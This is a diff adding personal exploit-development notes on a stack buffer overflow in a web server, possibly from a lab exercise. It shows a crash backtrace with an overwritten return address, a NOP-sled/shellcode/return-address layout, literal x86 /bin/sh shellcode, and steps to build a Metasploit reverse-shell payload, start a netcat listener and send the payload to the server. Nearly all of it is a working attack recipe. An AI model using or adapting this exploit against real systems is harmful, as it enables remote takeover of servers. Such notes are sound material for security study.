@@ -1,0 +1,38 @@
+The web server crashes at around 970 characters with a segmentation fault.
+
+The following bt was created by sending ABCD repeated 1000 times to the server
+Running a backtrace on the core file shows the following:
+#0 0x4207beac in ??
+#1 0x4204a315 in ??
+#2 0x42064e1c in ??
+#3 0x4205243d in ??
+#4 0x0804890f in ??
+#5 0x44434241 in ??
+Cannot access memory at address 0x44434241
+
+
+Hit the return address with the following:
+NOP='\x90'x 100
+SHC='ABCD'x  180 (will need to be replaced by the exploit)
+ADDR='WXYZ' x 300
+
+EGG=$NOP$SHC$ADDR
+
+Possible return address in the middle of NOP region: 0xbffff720
+
+I believe I got this to return a shell (though there is no listener so not received) with the following:
+NOP=`perl -e "print '\x90'x99"`
+SHC="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+ADDR=`perl -e "print '\x20\xf7\xff\xbf'x300"`
+EGG=$NOP$SHC$ADDR
+EGG=$(echo -e $EGG)
+
+I got this to work and return a reverse shell. Steps to reproduce:
+Create NOP sled with 98 '\x90'
+Create a payload using metasploit with shellcode /linux/x86/shell_reverse_tcp and x86/alpha_mixed encoder
+Set the LHOST to current IP and RHOST to victim IP
+Set LPORT to nc listener port and RPORT to server port
+Generate the payload
+Create Address as above
+Setup netcat listener nc -l -p LPORT -nvv
+Create payload as $NOP$SHC$ADDR and send to server
